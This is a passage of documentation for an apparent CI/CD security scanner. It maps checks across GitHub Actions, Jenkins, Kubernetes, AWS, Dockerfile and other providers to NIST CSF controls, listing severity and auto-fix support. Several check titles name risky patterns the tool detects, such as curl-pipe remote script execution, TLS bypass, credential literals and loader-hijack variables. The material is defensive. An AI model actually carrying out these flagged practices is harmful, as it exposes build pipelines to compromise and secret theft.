| [`GL-020`](#detail-gl-020) | CI_JOB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-007`](#detail-iam-007) | IAM user has access key older than 90 days | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`JF-004`](#detail-jf-004) | AWS auth uses long-lived access keys via withCredentials | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-008`](#detail-jf-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-010`](#detail-jf-010) | Long-lived AWS keys exposed via environment {} block | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-033`](#detail-jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-034`](#detail-jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-012`](#detail-k8s-012) | Pod automountServiceAccountToken not false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-034`](#detail-k8s-034) | ServiceAccount automountServiceAccountToken not explicitly false | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-037`](#detail-k8s-037) | ConfigMap data carries a credential-shaped literal | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-026`](#detail-scm-026) | Webhook ships events insecurely (HTTP / no-TLS / no-secret) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SM-001`](#detail-sm-001) | Secrets Manager secret has no rotation configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SSM-001`](#detail-ssm-001) | SSM Parameter with secret-like name is not a SecureString | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |

### PR.AA-03: Users, services, and hardware are authenticated { #ctrl-pr-aa-03 }

**Evidenced by 5 checks** across 3 providers (AWS, Cloud Build, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`GCB-002`](#detail-gcb-002) | Cloud Build uses the default service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-008`](#detail-iam-008) | OIDC-federated role trust policy missing audience or subject pin | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-036`](#detail-scm-036) | Active ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### PR.AA-05: Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed { #ctrl-pr-aa-05 }

**Evidenced by 26 checks** across 6 providers (AWS, Buildkite, CircleCI, GitHub Actions, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-013`](#detail-bk-013) | Deploy step has no branches: filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CA-004`](#detail-ca-004) | CodeArtifact repo policy grants codeartifact:* with Resource '*' | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-030`](#detail-cc-030) | Workflow job uses context without branch filter or approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CCM-003`](#detail-ccm-003) | CodeCommit trigger targets SNS/Lambda in a different account | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GHA-004`](#detail-gha-004) | Workflow has no explicit permissions block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`IAM-001`](#detail-iam-001) | CI/CD role has AdministratorAccess policy attached | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`IAM-002`](#detail-iam-002) | CI/CD role has wildcard Action in attached policy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-003`](#detail-iam-003) | CI/CD role has no permission boundary | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-004`](#detail-iam-004) | CI/CD role can PassRole to any role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-006`](#detail-iam-006) | Sensitive actions granted with wildcard Resource | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`K8S-011`](#detail-k8s-011) | Pod serviceAccountName unset or 'default' | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-020`](#detail-k8s-020) | ClusterRoleBinding grants cluster-admin or system:masters | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-021`](#detail-k8s-021) | Role or ClusterRole grants wildcard verbs+resources | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-029`](#detail-k8s-029) | RoleBinding grants permissions to the default ServiceAccount | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-042`](#detail-k8s-042) | RoleBinding grants access to system:anonymous / system:unauthenticated | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`KMS-002`](#detail-kms-002) | KMS key policy grants wildcard KMS actions | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-019`](#detail-scm-019) | Push restrictions allowlist names individual users | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-027`](#detail-scm-027) | Outside collaborator holds write / maintain / admin access | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-028`](#detail-scm-028) | Private repo allows forking | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SM-002`](#detail-sm-002) | Secrets Manager resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |

### PR.DS-01: The confidentiality, integrity, and availability of data-at-rest are protected { #ctrl-pr-ds-01 }

**Evidenced by 16 checks** across 6 providers (AWS, Buildkite, Dockerfile, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`BK-002`](#detail-bk-002) | Literal secret value in pipeline env block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-001`](#detail-ca-001) | CodeArtifact domain not encrypted with customer KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`ECR-005`](#detail-ecr-005) | Repository encrypted with AES256 rather than KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`JF-033`](#detail-jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-037`](#detail-k8s-037) | ConfigMap data carries a credential-shaped literal | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`KMS-001`](#detail-kms-001) | KMS customer-managed key has rotation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`LMB-003`](#detail-lmb-003) | Lambda function env vars may contain plaintext secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`S3-002`](#detail-s3-002) | Artifact bucket server-side encryption not configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SSM-002`](#detail-ssm-002) | SSM SecureString uses the default AWS-managed key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

### PR.DS-02: The confidentiality, integrity, and availability of data-in-transit are protected { #ctrl-pr-ds-02 }

**Evidenced by 17 checks** across 12 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-023`](#detail-ado-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-023`](#detail-bb-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-008`](#detail-bk-008) | TLS verification disabled in step command | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-023`](#detail-cc-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GHA-023`](#detail-gha-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-023`](#detail-gl-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-009`](#detail-helm-009) | Chart home / sources URL uses a non-HTTPS scheme | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-023`](#detail-jf-023) | TLS / certificate verification bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-035`](#detail-jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-027`](#detail-k8s-027) | Ingress has no TLS configuration | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`S3-005`](#detail-s3-005) | Artifact bucket missing aws:SecureTransport deny | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SCM-026`](#detail-scm-026) | Webhook ships events insecurely (HTTP / no-TLS / no-secret) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### PR.PS-01: Configuration management practices are established and applied { #ctrl-pr-ps-01 }

**Evidenced by 59 checks** across 12 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-013`](#detail-ado-013) | Self-hosted pool without explicit ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-015`](#detail-ado-015) | Job has no `timeoutInMinutes`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-017`](#detail-ado-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-005`](#detail-bb-005) | Step has no `max-time`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-013`](#detail-bb-013) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-016`](#detail-bb-016) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-020`](#detail-bb-020) | Full clone depth exposes complete history | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-005`](#detail-bk-005) | Container started with --privileged or host-bind escalation | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-006`](#detail-bk-006) | Step has no timeout_in_minutes | <span class="pg-sev pg-sev--low">LOW</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-002`](#detail-cb-002) | Privileged mode enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-004`](#detail-cb-004) | No build timeout configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CC-010`](#detail-cc-010) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-014`](#detail-cc-014) | Job missing `resource_class` declaration | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-015`](#detail-cc-015) | No `no_output_timeout` configured | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-017`](#detail-cc-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-002`](#detail-df-002) | Container runs as root (missing or root USER directive) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-008`](#detail-df-008) | RUN invokes docker --privileged or escalates capabilities | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-012`](#detail-df-012) | RUN invokes sudo | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-013`](#detail-df-013) | EXPOSE declares sensitive remote-access port | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-014`](#detail-df-014) | WORKDIR set to a system / kernel filesystem path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-015`](#detail-df-015) | RUN grants world-writable permissions (chmod 777 / a+w) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-017`](#detail-df-017) | ENV PATH prepends a world-writable directory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-018`](#detail-df-018) | RUN chown rewrites ownership of a system path | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-023`](#detail-df-023) | ENV sets a dynamic-loader hijack variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GCB-005`](#detail-gcb-005) | Build timeout unset or excessive | <span class="pg-sev pg-sev--low">LOW</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-012`](#detail-gha-012) | Self-hosted runner without ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-015`](#detail-gha-015) | Job has no `timeout-minutes`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-017`](#detail-gha-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-026`](#detail-gha-026) | Container job disables isolation via `options:` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-014`](#detail-gl-014) | Self-managed runner without ephemeral tag | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-015`](#detail-gl-015) | Job has no `timeout`, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-017`](#detail-gl-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-003`](#detail-jf-003) | Pipeline uses `agent any` (no executor isolation) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-014`](#detail-jf-014) | Agent label missing ephemeral marker | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-015`](#detail-jf-015) | Pipeline has no `timeout` wrapper, unbounded build | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-017`](#detail-jf-017) | Docker run with insecure flags (privileged/host mount) | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-025`](#detail-jf-025) | Kubernetes agent pod template runs privileged or mounts hostPath | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-002`](#detail-k8s-002) | Pod hostNetwork: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-003`](#detail-k8s-003) | Pod hostPID: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-004`](#detail-k8s-004) | Pod hostIPC: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-005`](#detail-k8s-005) | Container securityContext.privileged: true | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-006`](#detail-k8s-006) | Container allowPrivilegeEscalation not explicitly false | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-007`](#detail-k8s-007) | Container runAsNonRoot not true / runAsUser is 0 | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-008`](#detail-k8s-008) | Container readOnlyRootFilesystem not true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-009`](#detail-k8s-009) | Container capabilities not dropping ALL / adding dangerous caps | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-010`](#detail-k8s-010) | Container seccompProfile not RuntimeDefault or Localhost | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-013`](#detail-k8s-013) | Pod uses a hostPath volume | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-014`](#detail-k8s-014) | Pod hostPath references a sensitive host directory | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-019`](#detail-k8s-019) | Workload deployed in the 'default' namespace | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-023`](#detail-k8s-023) | Namespace missing Pod Security Admission enforcement label | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-025`](#detail-k8s-025) | System priority class used outside kube-system | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-030`](#detail-k8s-030) | Workload schedules onto a control-plane node | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-031`](#detail-k8s-031) | Namespace missing PSA warn label | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-035`](#detail-k8s-035) | Container securityContext.runAsUser is 0 | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-039`](#detail-k8s-039) | Pod uses shareProcessNamespace: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-040`](#detail-k8s-040) | Container securityContext.procMount: Unmasked | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-029`](#detail-scm-029) | Repository ruleset is in evaluate / disabled mode (not enforced) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### PR.PS-02: Software is maintained, replaced, and removed commensurate with risk { #ctrl-pr-ps-02 }

**Evidenced by 16 checks** across 12 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-020`](#detail-ado-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-015`](#detail-bb-015) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-011`](#detail-df-011) | Package manager install without cache cleanup in same layer | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
